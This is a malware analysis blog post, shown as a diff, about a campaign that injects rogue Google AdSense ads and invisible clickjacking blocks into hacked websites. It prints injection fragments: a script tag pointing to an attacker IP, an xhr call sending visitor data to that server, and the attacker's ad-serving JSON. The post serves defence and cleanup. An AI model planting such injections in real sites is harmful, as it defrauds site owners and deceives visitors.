@@ -1,0 +1,76 @@
+Injection of Unwanted Google AdSense Ads
+
+During the last couple of years, it has become quite prevalent for hackers to monetize compromised sites by injecting unwanted ads. They can be pop-up ads triggered when a visitor spends a certain amount of time on an infected page, or automatic redirection of mobile traffic to URLs that belong to ad networks.
+It’s not uncommon to see adult ads since networks that work with the porn industry usually allow a higher level of anonymity and have less strict guidelines (if any) on the quality of traffic their partners try to send their way.
+Obfuscation Through Ad Network Redirects
+Hackers also use smaller ad networks that resell their traffic to larger networks. It is typical to see a malware campaign triggering a chain of 3-5 redirects from one ad network to another. At the end of the chain, the network that serves the malicious ad or landing page has absolutely no clue where the visitor originally came from.
+In this way, the black hat (or low quality) traffic is sent through gray hat, intermediary traffic aggregator services, which finally redirect to white hat ad networks. This process helps avoid problems with blocked accounts and complaints because the final ad networks don’t work directly with the hackers and intermediary services just ignore such complaints.
+Hackers don’t always use smaller, less-known ad networks. Some of them find a way to abuse Google AdSense to monetize compromised sites.
+Script Hosted at IP Address
+We noticed a malware campaign that used the IP address 128 .199 .161 .173 in its URL. It infected sites using two different methods.
+The first involved an iframe injected directly into HTML code:
+<script type="text/javascript" src="//128 .199 .161 .173/proxy/9/image.js"></script>
+The second method infects sites by appending malicious code to legitimate JavaScript files; for example wp-includes/wp-embed.min.js (in the case of WordPress):
+Malicious injection inside wp-embed.min.js
+In either case, the URLs vary from site to site but they all have the same pattern where X and Y are random numbers:
+
+iFrames: 128 .199 .161 .173/proxy/X/imageY.js
+JavaScript files: 128 .199 .161 .173/proxy/X/imageY.php
+
+The injected JavaScript code is actually the same code as the .js files used in the iframes.
+What the Script Does
+This script creates new div elements containing Google Ads and places them above the legitimate page content. Even if you resize or scroll the page, the ads will not go away and continue to hide a large part of the legitimate page content.
+Real example of a web page infected by this malware
+Annoying, isn’t it?
+Some might think that clicking on the ads will make them go away. This means the click-through rate (CTR) of this malicious AdSense block should be pretty high.
+How the Script Works
+This script has three parts:
+
+The first part is copied from scripts that ad networks use to collect all available information about the visitor’s device: mobile or desktop, screen resolution, dimensions and orientation, the make of the device (it can even detect several makes of Smart TV), etc.
+The second part is a call to the freegeoip.net API service that returns the visitor’s geographical location.
+The third part uses the collected intelligence to make a decision whether to show or not show ads to the visitor.
+
+Deciding whether or not to show the ads, the script makes a call to the 128 .199 .161 .173/proxy/X/imageY.php URL, sending the data as parameters:
+xhr.open('GET',url+"?c="+arg.ip+"&m="+(!window.device.desktop()?1:0)
++(getRequestParameter("_G_SKIP") ? "&_G_SKIP=1" : ""), true);
+This remote script checks if the visitor matches the criteria set by the attackers, and returns this JSON code:
+{
+"a": "s",
+"r": [{
+"s": "b",
+"c": "<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n
+data-ad-client=\"ca-pub-6084006984157614\"\n     data-ad-slot=\"7787055686\"\n
+data-ad-format=\"auto\"></ins> "
+}]
+}
+This JSON code provides data needed to build Google AdSense ads on the fly – the AdSense client ID (always ca-pub-6084006984157614) and the ad slot ID (7787055686 in this case, but it varies based on the device and screen dimensions).
+If the visitor is not interesting to the attackers, the creation of the ad blocks is canceled. It even goes a step further by installing a special cookie for one year to prevent ad injections from showing to that particular visitor.
+AdSense Policy on Ad Blocks From Different Publishers
+The same AdSense ID is used in all cases where we could find this infection. It works even on sites that have their own AdSense blocks (with different publisher IDs, of course). The attack abuses the Google AdSense policy rule:
+If a site is in compliance with our program policies and the company or owner of the site has given you permission to display ads on their site, you may place your ad code on the same page as the other publisher’s ad code. You will, however, need to contact your web hosting company or the owner of the site to obtain permission to display ads on their site. Additionally, you will only be credited for clicks and impressions on the ad units associated with your account.
+While Google allows multiple AdSense blocks that belong to different publishers, it doesn’t make this injection legitimate to Google since the site owner’s permission was definitely not obtained. The aggressive ad placement and dynamic ad loading is also explicitly prohibited by the AdSense policy.
+Unfortunately, the injected ads may cause problems for the site owner’s legitimate AdSense account. It’s easier to find the legitimate publisher ID if you inspect the site because the attacker’s ID is being loaded on the fly from a third-party server. Here’s what AdSense policy has to say about such cases:
+Keep in mind that every publisher is responsible for the content of a site on which their ad code is placed. If a site is found in violation of our policies, we will notify any publisher(s) whose ad code is on the site.
+Malware Localization in WordPress
+As we mentioned, in WordPress sites the malware is usually appended at the bottom of the core wp-includes/wp-embed.min.js file. If you monitor integrity of the core files, you should be notified about this.
+Alternatively, the iframe code is usually injected into one of the text widgets, which imply that the hackers must be able to log into the WordPress admin interface. This is why changing the WordPress admin password and reviewing the whole list of WordPress users for any anomalies is a very important step of a cleanup procedure.
+Magento, Joomla, and Static Sites
+This infection is not limited to WordPress. We noticed it on Magento, Joomla and even pure HTML sites. This proves that the attackers don’t use a single infection vector. They just try to infect any site they can break into.
+Further analysis showed that some of the sites were later reinfected with another malware campaign that also creates rogue AdSense ad blocks. This time it was not a script or iframe injection. I noticed it by accident when I opened one of the Brazilian Magento sites with this blatant ad at the top:
+Suspicious ad
+Suspicious Ads
+The ad clearly didn’t belong on the site, so I decided to check the HTML source code. It appeared that this was not an ad created by some third-party script. It was hard-coded directly into the <head> section of the page. What was even more suspicious was that the code included the Google AdSense block:
+Free gift image and Google AdSense code
+Despite this, I didn’t see AdSense anywhere on the page. The “free gift” ad had no signs of a real AdSense block (e.g. “Ads by Google”), and the gift box was just an image hosted on blogspot. Then I noticed that the <div> with the AdSense block was styled with opacity: 0 which means it was completely transparent and invisible to visitors.
+So it appears this was a clickjacking attempt. In this case, they try to get visitors to click on invisible ads. Personally, I’m not sure why attackers thought the blatant “free gift” image was a better bait than contextual and personalized real Google ads. I did some tests and noticed that this trick wouldn’t work (reliably) with AdSense. In most cases Google created empty transparent iframes instead of real ads.
+Defacements and Ad Injections
+This time the AdSense client ID was different: ca-pub-4164141051968509. When I Googled for it, I found a few more sites that used to have the same code injected (using Google’s cache). However, at the time, the sites didn’t have this code. They had a different problem – defacement.  They were defaced by Indonesian hackers. In the case of Magento, the defacement code was injected into the same place in the <head> section as the AdSense clickjacking code above.
+At this point it occurred to me that the rogue AdSense ad injections could also come from the Indonesian hackers, who might be experimenting with monetization of the sites that they hack. Maybe not the same group, but someone from that region with a similar background. After all, the ad injections look very amateurish. They don’t always work as expected, and it’s very easy to block their account before they even have a chance to withdraw money from them.
+This all suggests we’re dealing with hackers who are better at the destructive part of website hacking, but have problems with its constructive part. The attackers are making poor long-term decisions by using unreliable schemes to monetize their compromised sites. These attackers use the same tools as the defacers, which explains why they target the same sites that are are being constantly infected and reinfected by various Indonesian hacking groups.
+DigitalOcean Singapore
+One more clue that proves my hypothesis, is the IP address of the malware that I began this blog post with: 128 .199 .161 .173. It points to a DigitalOcean server. What’s really interesting is the location of that server.
+DigitalOcean allows you to choose a geographical location of your server: North America, Europe, Asia, etc. People normally choose the closest one either to them or to the majority of their site visitors. In this case, the server location is Singapore. That’s a very specific location. It’s not the first option, so people don’t choose it by default. However, the choice is natural for someone who lives in Indonesia, as Singapore is the closest datacenter for them.
+Conclusion
+Compromised websites are an ideal platform to install rogue third-party ads. Malware may create pop-ups, add new ad blocks or even replace ad network IDs to steal revenue from site owners.
+Site owners should keep a close eye on what ads they see on their sites and make sure that their ad scripts are not modified. If you use AdSense, check the AdSense ID numbers on your site pages. It’s a good idea to regularly open your site on different devices and ask friends/visitors from different cities/countries whether they see anything strange in the site behavior.
+For security scanners sometimes it may be a problem to tell legitimate ads from those installed by hackers. That’s why it is important to have integrity monitoring of your website files. When you are notified about any modifications, you can easily spot any unwanted changes.
